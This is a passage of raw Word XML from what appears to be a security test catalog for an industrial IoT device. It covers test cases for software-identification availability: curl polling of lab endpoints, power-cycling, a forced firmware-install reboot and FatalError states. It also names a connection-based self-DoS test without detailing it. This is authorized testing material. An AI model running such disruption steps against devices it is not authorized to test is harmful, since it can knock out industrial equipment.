        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId171" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DA7CE7C" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:pict w14:anchorId="1C7ADF1D">
          <v:rect id="_x0000_i1480" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A92BA2" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FBD5B8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 xml:space="preserve">Full entries for the accessibility baseline (TS-1), the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>availability-across-states</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> proof (TS-2 → G-1, the core), and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2-connection self-DoS</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> proof (TS-3 → G-2). TS-4 follows the established template. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>No generalized-flood entry</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (→ RQ-010).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D42D506" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:pict w14:anchorId="30CE0DAA">
          <v:rect id="_x0000_i1481" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F33793" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ007-01 — Identification Availability &amp; Accessibility Baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A7C790" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"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741"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="565880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9FABE3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215BB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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="1C4D0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6BD58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AAA1E" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>TC-RQ007-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="281FFB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6C915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lastRenderedPageBreak/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D1A20" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">RQ-007 (EHSR </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>identification</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>availability</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>accessibility</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>) → CR 7.8 / CR 6.1 → Asset H, Asset D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="5E845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F317E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A9C8B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Loss of availability (baseline reference)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="44511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59FEF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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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54E7F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SVV-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="5D344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816D5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0DB93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Confirm that, in normal OPERATE, the safety-relevant installed-software identification is retrievable and presented in an </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>easily accessible form</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (browser Visualizer + human-readable version strings), establishing the availability baseline.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="42F0A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A9A4F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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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E9D99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1. In OPERATE, open the IoT-Core Visualizer by device IP. 2. Retrieve all safety-relevant SW identifiers. 3. Confirm values are human-readable and the Visualizer renders without special tooling.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="361CC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0C072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39660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PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the Visualizer loads and all safety-relevant SW identifiers are shown in human-readable form (accessibility limb met). </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> any identifier is unreadable or the Visualizer is inaccessible in OPERATE.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="09F9D036" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538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015538" w:rsidRPr="00015538" w14:paraId="1C782B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B56C8D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123B41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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="1B16A3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FC277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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0001553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41A02" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>TC-RQ007-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="64A6F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FF1FC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32033" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">DUT 192.168.0.2; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>browser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> 192.168.50.20; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="41D55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0AA79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8CBF5" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">Web </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>browser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (Visualizer), </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>curl</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="7AA35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15B62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Procedure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B86E9" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>http://192.168.0.2 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>Visualizer</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve">) + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>curl</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve"> -s http://192.168.0.2/deviceinfo/swinfo/scpuversion etc.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="5E9F3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CE02E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12E70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☐ Visualizer accessible ☐ SW identifiers human-readable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="511B5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65367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A6756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Visualizer screenshot, TC0701_ids.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="209A31C8" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:pict w14:anchorId="6BEEFA16">
          <v:rect id="_x0000_i1482" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="567494A1" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ007-02 — Identification Availability Across Operating States (G-1 proof — core)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5176CF8F" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538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7756"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="77FCA1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059071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8323AE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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="015B6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AFC25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7F554" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>TC-RQ007-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="54D1B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57C81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61CF6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RQ-007 → CR 7.8 / (availability, FR 7) → Asset H, Asset D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="369B51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28DC3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51ECD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Inherent unavailability (design/reliability, not attack)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="15D9F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CA9FB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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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20801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SVV-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (Threat-Mitigation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="0EE5C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F4925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5F285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Demonstrate that identification data is </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>not available "at all times"</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> by continuously polling the identification endpoint while the device transitions through Init (power-cycle), Update (999 + install reboot), and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FatalError</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>, and by identifying the SCPU-flash window in which SCPU-sourced identifiers vanish.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="5AF81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A2761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lastRenderedPageBreak/>
              <w:t xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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58550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1. Start a timestamped polling loop against a COM-sourced and an SCPU-sourced identifier. 2. Power-cycle (Init window). 3. Enter Update (999 + reboot; trigger /firmware/install reboot on a spare DUT). 4. Force </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FatalError</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>. 5. Record every interval where the request fails or the SCPU-sourced value is absent.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="22A4E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3795E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3FA45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Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> measurable outage windows during Init, install-reboot, and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FatalError</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, and unavailability of SCPU-sourced identifiers during the SCPU flash → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL against "at all times."</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> A device returning valid identification continuously through all states would refute G-1 (investigate).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2BD57957" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538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6482"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="1529D0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9CC005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7F4940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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="65C6D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E63BB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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0001553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49F7A" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>TC-RQ007-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="7A73D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E276A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ACEFF" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">Spare DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="557E9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37849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A7671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curl polling loop with timestamps; power switch; rotary switch</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="73C48DCE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# TC-RQ007-02 Availability sampling across state transitions (design-inherent unavailability)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5680FDBD" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>LOG=TC0702_avail.csv; echo "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ts,endpoint,http_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>" &gt; $LOG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9316B3" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>poll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">() { </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>while</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> true; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDA9F19" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
